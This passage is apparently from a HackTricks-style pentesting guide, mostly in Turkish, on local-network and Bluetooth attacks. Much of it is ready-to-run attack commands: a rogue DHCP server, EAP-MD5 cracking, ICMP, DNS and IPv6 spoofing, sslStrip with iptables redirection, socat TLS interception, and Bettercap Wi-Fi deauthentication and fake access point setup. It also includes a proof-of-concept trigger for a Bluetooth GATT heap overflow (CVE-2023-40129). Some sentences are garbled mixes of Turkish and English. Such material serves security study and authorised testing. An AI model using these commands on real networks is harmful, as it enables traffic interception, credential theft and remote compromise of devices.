`/usr/share/responder/DHCP.py` konumundaki DHCP betiği kullanılarak bir sahte DHCP sunucusu kurulabilir. Bu, trafiği kötü amaçlı bir sunucuya yönlendirerek HTTP trafiğini ve kimlik bilgilerini yakalamak gibi network saldırıları için kullanışlıdır. Ancak, sahte bir gateway ayarlamak daha az etkilidir; çünkü bu yalnızca istemcinin giden trafiğini yakalamanıza izin verir ve gerçek gateway'den gelen yanıtları kaçırırsınız. Daha etkili bir saldırı için sahte bir DNS veya WPAD sunucusu kurmanız önerilir.

Below are the command options for configuring the rogue DHCP server:

- **Our IP Address (Gateway Advertisement)**: Makinenizin IP'sini gateway olarak duyurmak için `-i 10.0.0.100` kullanın.
- **Local DNS Domain Name**: İsteğe bağlı olarak yerel DNS alan adını ayarlamak için `-d example.org` kullanın.
- **Original Router/Gateway IP**: Meşru router veya gateway'in IP adresini belirtmek için `-r 10.0.0.1` kullanın.
- **Primary DNS Server IP**: Kontrol ettiğiniz sahte DNS sunucusunun IP adresini ayarlamak için `-p 10.0.0.100` kullanın.
- **Secondary DNS Server IP**: İsteğe bağlı olarak ikincil DNS sunucusu IP'sini ayarlamak için `-s 10.0.0.1` kullanın.
- **Netmask of Local Network**: Yerel ağın netmask'ini tanımlamak için `-n 255.255.255.0` kullanın.
- **Interface for DHCP Traffic**: Belirli bir ağ arayüzünde DHCP trafiğini dinlemek için `-I eth1` kullanın.
- **WPAD Configuration Address**: WPAD yapılandırması adresini ayarlamak ve web trafiğinin yakalanmasına yardımcı olmak için `-w “http://10.0.0.100/wpad.dat”` kullanın.
- **Spoof Default Gateway IP**: Varsayılan gateway IP'sini spooflamak için `-S` ekleyin.
- **Respond to All DHCP Requests**: Sunucunun tüm DHCP isteklerine cevap vermesini sağlamak için `-R` ekleyin; ancak bunun gürültülü olduğunu ve tespit edilebileceğini unutmayın.

Bu seçenekleri doğru kullanarak, ağ trafiğini etkili şekilde yakalamak için bir sahte DHCP sunucusu kurulabilir.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP Saldırıları**

Here are some of the attack tactics that can be used against 802.1X implementations:

- EAP üzerinden aktif brute-force parola denemeleri
- Bozuk EAP içeriği ile RADIUS sunucusuna saldırmak _\*\*_(exploits)
- EAP mesaj yakalama ve çevrimdışı password cracking (EAP-MD5 ve PEAP)
- TLS sertifika doğrulamasını atlatmak için EAP-MD5 kimlik doğrulamasını zorlamak
- Hub veya benzeri cihaz kullanılarak kimlik doğrulama sonrası zararlı ağ trafiği enjekte etmek

If the attacker if between the victim and the authentication server, he could try to degrade (if necessary) the authentication protocol to EAP-MD5 and capture the authentication attempt. Then, he could brute-force this using:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Saldırıları <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol), **sıcak yedekli bir yönlendirme sistemi oluşturmak** için tasarlanmış bir ağ protokolleri sınıfıdır. FHRP ile fiziksel router'lar tek bir mantıksal cihaz halinde birleştirilebilir; bu, hata toleransını artırır ve yükün dağıtılmasına yardımcı olur.

**Cisco Systems mühendisleri iki FHRP protokolü geliştirmiştir: GLBP ve HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Routing Information Protocol (RIP) protokolünün üç sürümünün var olduğu bilinmektedir: RIP, RIPv2 ve RIPng. Datagramlar RIP ve RIPv2 tarafından UDP üzerinden port 520'ye gönderilirken, RIPng datagramları IPv6 multicast yoluyla UDP port 521'e yayınlar. RIPv2 MD5 kimlik doğrulama desteği getirmiştir. Buna karşılık, RIPng yerel kimlik doğrulama içermez; bunun yerine IPv6 içinde isteğe bağlı IPsec AH ve ESP başlıklarına dayanılır.

- **RIP ve RIPv2:** İletişim UDP datagramlarıyla port 520 üzerinden yapılır.
- **RIPng:** Datagramları IPv6 multicast ile UDP port 521 üzerinden yayınlar.

RIPv2'nin MD5 kimlik doğrulamayı desteklediğini, RIPng'in yerel kimlik doğrulama içermediğini ve bunun yerine IPv6'da IPsec AH ve ESP başlıklarına dayanıldığını unutmayın.

### EIGRP Saldırıları

**EIGRP (Enhanced Interior Gateway Routing Protocol)** dinamik bir routing protokolüdür. **Bu bir distance-vector protokolüdür.** Eğer **kimlik doğrulama yoksa** ve passive interface'ler yapılandırılmamışsa, bir **intruder** EIGRP yönlendirmesine müdahale edebilir ve **routing tables poisoning**'e neden olabilir. Ayrıca, EIGRP ağı (başka bir deyişle autonomous system) **düz (flat) bir yapıya sahiptir ve herhangi bir zone'a ayrılmamıştır**. Eğer bir **attacker bir route enjekte ederse**, bu route muhtemelen autonomous EIGRP sistemi genelinde **yayılacaktır**.

Bir EIGRP sistemine saldırmak, meşru bir EIGRP router ile komşuluk (neighbourhood) kurmayı gerektirir; bu da temel keşiften çeşitli injection'lara kadar pek çok imkanı açar.

[**FRRouting**](https://frrouting.org/) size BGP, OSPF, EIGRP, RIP ve diğer protokolleri destekleyen **sanal bir router** uygulamanıza imkan verir. Tek yapmanız gereken onu attacker sisteminize deploy etmek; böylece routing domain içinde meşru bir router gibi davranabilirsiniz.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) EIGRP (Enhanced Interior Gateway Routing Protocol) broadcast'larını intercept etme yeteneklerine sahiptir. Ayrıca paket injection'ı yapmaya izin verir; bu da routing konfigürasyonlarını değiştirmek için kullanılabilir.

### OSPF

Open Shortest Path First (OSPF) protokolünde, router'lar arasında güvenli iletişimi sağlamak için genellikle MD5 kimlik doğrulama kullanılır. Ancak bu güvenlik önlemi Loki ve John the Ripper gibi araçlar kullanılarak aşılabilir. Bu araçlar MD5 hash'lerini yakalayıp kırabilir ve kimlik doğrulama anahtarını ortaya çıkarabilir. Anahtar elde edildikten sonra yeni routing bilgileri eklemek için kullanılabilir. Route parametrelerini yapılandırmak ve ele geçirilmiş anahtarı belirlemek için sırasıyla _Injection_ ve _Connection_ sekmeleri kullanılır.

- **MD5 hash'lerinin yakalanması ve kırılması:** Bu amaçla Loki ve John the Ripper gibi araçlar kullanılır.
- **Route parametrelerinin yapılandırılması:** Bu _Injection_ sekmesi üzerinden yapılır.
- **Ele geçirilmiş anahtarın ayarlanması:** Anahtar _Connection_ sekmesi altında yapılandırılır.

### Diğer Genel Araçlar ve Kaynaklar

- [**Above**](https://github.com/c4s73r/Above): Ağ trafiğini taramak ve zafiyetleri bulmak için bir araç
- Ağ saldırıları hakkında **daha fazla bilgi** için [**here**](https://github.com/Sab0tag3d/MITM-cheatsheet) bakabilirsiniz.

## **Spoofing**

Attacker, sahte DHCP cevapları göndererek ağdaki yeni üyenin tüm ağ parametrelerini (GW, IP, DNS) yapılandırır.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Check the [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirect, bir IP'ye ulaşmak için en iyi yolun attacker olduğunu belirten type 1 code 5 tipinde bir ICMP packet göndermeye dayanır. Sonra, victim IP ile iletişim kurmak istediğinde packet'i attacker üzerinden gönderir.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

Saldırgan, hedefin istediği bazı (veya tüm) alan adlarını çözecektir.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasq ile kendi DNS'inizi yapılandırın**
```bash
apt-get install dnsmasq
echo "addn-hosts=dnsmasq.hosts" > dnsmasq.conf
echo "127.0.0.1   domain.example.com" > dnsmasq.hosts
sudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Yerel Ağ Geçitleri

Sistemlere ve ağlara genellikle birden fazla rota vardır. Yerel ağdaki MAC adreslerinin bir listesini oluşturduktan sonra, IPv4 forwarding'i destekleyen hostları belirlemek için _gateway-finder.py_ kullanın.

<details>
<summary>gateway-finder kullanım örneği</summary>
```bash
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
</details>


### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

DNS sorgulamaları başarısız olduğunda yerel host çözümlemesi için Microsoft sistemleri **Link-Local Multicast Name Resolution (LLMNR)** ve **NetBIOS Name Service (NBT-NS)**'ye güvenir. Benzer şekilde, **Apple Bonjour** ve **Linux zero-configuration** uygulamaları ağ içindeki sistemleri keşfetmek için **Multicast DNS (mDNS)** kullanır. Bu protokollerin kimlik doğrulama olmadan çalışması ve UDP üzerinden yayın yapmaları nedeniyle, kullanıcıları kötü amaçlı servislere yönlendirmeyi amaçlayan saldırganlar tarafından kötüye kullanılabilirler.

Responder kullanarak hostların aradığı hizmetlerin taklidini yapıp sahte yanıtlar gönderebilirsiniz.  
Responder ile hizmetleri nasıl taklit edeceğinize dair daha fazla bilgi için buraya bakın: [Responder ile hizmetleri nasıl taklit edeceğinize dair daha fazla bilgi](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Tarayıcılar genellikle proxy ayarlarını otomatik almak için **Web Proxy Auto-Discovery (WPAD) protokolünü kullanır**. Bu, sunucudan yapılandırma detaylarının alınmasını içerir; örneğin "http://wpad.example.org/wpad.dat" gibi bir URL üzerinden. İstemcilerin bu sunucuyu keşfetmesi çeşitli mekanizmalarla gerçekleşebilir:

- **DHCP** yoluyla; keşif özel bir 252 kodlu giriş kullanılarak sağlanır.
- **DNS** aracılığıyla; yerel alan içinde _wpad_ etiketli bir hostname aranır.
- **Microsoft LLMNR ve NBT-NS** aracılığıyla; DNS sorgulamaları başarısız olduğunda başvurulan yedek mekanizmalardır.

Responder aracı bu protokolden faydalanarak **kötü amaçlı bir WPAD sunucusu** gibi davranır. İstemcileri kendisine bağlanmaya ikna etmek için DHCP, DNS, LLMNR ve NBT-NS kullanır. Responder ile hizmetlerin nasıl taklit edileceği hakkında daha fazla ayrıntı için bkz: [spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Ağa farklı hizmetler sunarak bir kullanıcıyı bazı **düz metin kimlik bilgilerini** girmeye **kandırmayı** deneyebilirsiniz. Bu saldırı hakkında daha fazla bilgi için [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md) dosyasına bakın.

### IPv6 Neighbor Spoofing

Bu saldırı ARP Spoofing'e çok benzer, ancak IPv6 dünyasında gerçekleşir. Kurbanın, GW'nin IPv6 adresinin saldırganın MAC adresine ait olduğunu düşünmesini sağlayabilirsiniz.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Bazı OS'ler, ağda gönderilen RA paketlerinden varsayılan gateway'i otomatik olarak ayarlar. Saldırganı IPv6 router olarak ilan etmek için şunu kullanabilirsiniz:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Varsayılan olarak bazı OS'ler ağda görülen bir DHCPv6 paketini okuyarak DNS'i yapılandırmaya çalışır. Bu durumda saldırgan, kendisini DNS olarak yapılandırmak için bir DHCPv6 paketi gönderebilir. DHCP ayrıca kurbana bir IPv6 adresi sağlar.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (sahte sayfa ve JS code injection)

## İnternet Saldırıları

### sslStrip

Temelde bu saldırı şu şekilde işler: bir **user** **access** etmeye çalıştığı ve **redirecting** olarak **HTTPS** sürümüne yönlendirilen bir **HTTP** sayfası durumunda gerçekleşir. **sslStrip**, bir **HTTP connection with** the **client and** bir **HTTPS connection with** the **server** olacak şekilde bağlantıyı **maintain** eder; böylece bağlantıyı **plain text** olarak **sniff** edebilir.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Daha fazla bilgi [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ ve dns2proxy ile HSTS'yi atlatma

**sslStrip+ and dns2proxy**'nın **sslStrip**'e karşı **farkı** şudur: örneğin _**www.facebook.com**_'u _**wwww.facebook.com**_ (**ek** "**w**"e dikkat) **yönlendirecekler** ve bu domainin adresini **saldırgan IP'si olarak ayarlayacaklar**. Bu şekilde, **istemci** _**wwww.facebook.com**_ **(saldırgan)** ile **bağlanacak**, fakat arka planda **sslstrip+** gerçek bağlantıyı HTTPS ile **www.facebook.com** üzerinden **sürdürecek**.

Tekniğin amacı HSTS'yi atlatmaktır çünkü _**wwww**.facebook.com_ **tarayıcının önbelleğine** kaydedilmeyecek, bu yüzden tarayıcı facebook kimlik doğrulamasını HTTP üzerinden yapması için kandırılacak.\
Dikkat: bu saldırıyı gerçekleştirmek için kurbanın başlangıçta http://www.faceook.com adresine ve **https**'e değil **http**'ye erişmeye çalışması gerekir. Bu, bir http sayfası içindeki linkleri değiştirerek yapılabilir.

Daha fazla bilgi [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ doesn't work anymore. This is because there are HSTS rules presaved in the browsers, so even if it's the first time that a user access an "important" domain he will access it via HTTPS. Also, notice that the presaved rules and other generated rules can use the flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **so the** _**wwww.facebook.com**_ **example from before won't work anymore as** _**facebook.com**_ **uses HSTS with `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP port dinleme
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL ile portta dinleme

#### Anahtarları ve kendi imzalı sertifikayı oluştur
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Sertifika kullanarak dinleme
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Sertifika kullanarak dinleyin ve hostlara yönlendirin
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Bazen, istemci CA'nın geçerli olduğunu kontrol ediyorsa, **serve a certificate of other hostname signed by a CA**.\
Başka ilginç bir test, c**ertificate of the requested hostname but self-signed** sunmaktır.

Test edilecek diğer şeyler: certificate'i geçerli bir certificate ile imzalamayı denemek, fakat bu certificate'in bir valid CA olmaması. Veya geçerli public key'i kullanıp diffie hellman gibi (gerçek private key ile hiçbir şeyi decrypt etmeyi gerektirmeyen) bir algoritma kullanmaya zorlamak; ve istemci gerçek private key'in bir probe'unu (like a hash) istediğinde sahte bir probe gönderip istemcinin bunu kontrol etmediğini beklemek.

## Bettercap

<details>
<summary>Yaygın Bettercap komutları</summary>
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
</details>


### Active Discovery Notes

Dikkate alın: bir UDP paketi hedef cihazda istenen port bulunmuyorsa ICMP (Port Unreachable) mesajı gönderilir.

### **ARP discover**

ARP paketleri, ağ içinde hangi IP'lerin kullanıldığını keşfetmek için kullanılır. PC her olası IP adresi için bir istek göndermek zorundadır ve yalnızca kullanılan adresler yanıt verir.

### **mDNS (multicast DNS)**

Bettercap, **\_services\_.dns-sd.\_udp.local** için her X ms'de bir MDNS isteği gönderir; bu paketi gören cihaz genellikle bu isteğe yanıt verir. Sonrasında yalnızca "services" olarak yanıt veren cihazları arar.

**Tools**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap, port 137/UDP'ye broadcast paketleri göndererek "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA" isimini sorgular.

### **SSDP (Simple Service Discovery Protocol)**

Bettercap, her türlü servisi aramak için SSDP paketleri yayınlar (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap, servisleri aramak için WSD paketleri yayınlar (UDP Port 3702).


## Bluetooth (L2CAP/ATT/GATT) Saldırıları

- Android Fluoride, L2CAP PSMs üzerinden servisleri açar (ör., SDP 0x0001, RFCOMM 0x0003, BNEP 0x000F, AVCTP 0x0017/0x001B, AVDTP 0x0019, ATT/GATT 0x001F). Servisler şu şekilde kaydolur:
```c
uint16_t L2CA_Register2(uint16_t psm, const tL2CAP_APPL_INFO& p_cb_info,
bool enable_snoop, tL2CAP_ERTM_INFO* p_ertm_info,
uint16_t my_mtu, uint16_t required_remote_mtu,
uint16_t sec_level);
```
- BlueBlue framework, Scapy-based L2CAP/ATT crafting'e olanak sağlar (BlueBorne l2cap_infra üzerine inşa edilmiştir). Örnek:
```python
acl  = ACLConnection(src_bdaddr, dst_bdaddr, auth_mode='justworks')
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=672)
gatt.send_frag(p8(GATT_READ)+p16(1234))
print(gatt.recv())
```
- CVE-2023-40129 (Fluoride GATT): Read Multiple Variable response builder'ındaki integer underflow, MTU bir variable-length element'i truncate ettiğinde ancak +2 length field hesaba katılmadığında yaklaşık ~64KB heap overflow'a neden olabilir.

<details>
<summary>Kök neden (GATT Read Multiple Variable)</summary>
```c
static void build_read_multi_rsp(tGATT_SR_CMD* p_cmd, uint16_t mtu) {
uint16_t ii, total_len, len; uint8_t* p; bool is_overflow=false;
len = sizeof(BT_HDR) + L2CAP_MIN_OFFSET + mtu;
BT_HDR* p_buf = (BT_HDR*)osi_calloc(len); p_buf->offset=L2CAP_MIN_OFFSET;
p = (uint8_t*)(p_buf + 1) + p_buf->offset; *p++ = GATT_RSP_READ_MULTI_VAR;
p_buf->len=1;
for (ii=0; ii<p_cmd->multi_req.num_handles; ii++) {
tGATTS_RSP* p_rsp = ...; // dequeued
if (p_rsp) {
total_len = (p_buf->len + p_rsp->attr_value.len);
if (p_cmd->multi_req.variable_len) total_len += 2;
if (total_len > mtu) {
len = p_rsp->attr_value.len - (total_len - mtu); // BUG: ignores +2
is_overflow = true;
} else { len = p_rsp->attr_value.len; }
if (p_cmd->multi_req.variable_len) { UINT16_TO_STREAM(p, len); p_buf->len += 2; }
memcpy(p, p_rsp->attr_value.value, len); // heap overflow
if (!is_overflow) p += len; p_buf->len += len; if (is_overflow) break;
}
}
}
```
- Değişken-uzunluklu girdilerde, overflow path yalnızca (total_len - mtu) çıkarıyor, +2 length field'ını göz ardı ediyor; bu yüzden len underflows (ör. 0xFFFE) ve memcpy buffer'ın sonundan ~64KB ötesine yazıyor.
</details>

- Minimal doğrulamasız trigger (small MTU forces underflow on the 4th attribute):
```python
# GATT_REQ_READ_MULTI_VAR (0x20), MTU=55
acl  = ACLConnection(interface, bdaddr)
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=55)
pkt  = b'\x20'  # opcode
pkt += p16(9); pkt += p16(9); pkt += p16(9); pkt += p16(9)
gatt.send(pkt)
# On 4th insert: p_buf->len=55 (1 + 3*(16+2)), total_len=73 -> len=16-(73-55)=-2 -> ~64KB overwrite
```
### Telekom / Mobil-Çekirdek (GTP) Sömürüsü


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## Referanslar

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Ağ Güvenliği Değerlendirmesi: Ağınızı Tanıyın (3. baskı)**
- **Practical IoT Hacking: Nesnelerin İnternetine Saldırmanın Kesin Rehberi. Yazarlar: Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Paint it blue: Attacking the bluetooth stack (Synacktiv)](https://www.synacktiv.com/en/publications/paint-it-blue-attacking-the-bluetooth-stack)
- [BlueBorne L2CAP testing infra (l2cap_infra)](https://github.com/ArmisSecurity/blueborne/tree/master/l2cap_infra)



{{#include ../../banners/hacktricks-training.md}}
